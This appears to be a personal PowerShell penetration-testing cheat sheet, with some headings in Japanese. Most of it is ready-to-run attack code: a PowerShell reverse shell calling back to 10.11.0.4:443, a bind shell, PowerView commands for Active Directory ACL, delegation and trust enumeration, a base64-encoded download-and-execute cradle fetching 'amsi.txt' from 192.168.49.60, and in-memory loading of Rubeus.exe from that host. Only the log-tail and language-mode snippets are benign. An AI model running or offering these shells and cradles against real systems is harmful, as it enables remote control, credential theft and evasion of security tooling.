# 最新ログの閲覧
```
gc file.log -wait -tail 1 | sls -Pattern "keyword"
```
# reverse shell
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
# bind shell
```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

# proxy経由で自己署名httpsサーバーへの接続
```
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$proxy = new-object System.Net.WebProxy('http://proxy:port');$wc = new-object system.net.webclient;$wc.proxy = $proxy;$wc.downloadString('https://server:port/test.html')
```
# powerview
```
Get-ObjectAcl -Identity username -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}

Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

Get-ObjectAcl -Identity username
 
ConvertFrom-SID sid
 
Get-DomainComputer -Unconstrained
Get-DomainUser -AllowDelegation -AdminCount
 
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
 
Get-DomainTrust
 
Get-DomainUser -Domain domainname

Get-DomainSID -Domain domainname
```

# convert string to base64
```
$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.60/amsi.txt') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText
```

# exeのin-memory実行
```
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.60/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("purge".Split())
```

# Language Mode
```
$ExecutionContext.SessionState.LanguageMode
```
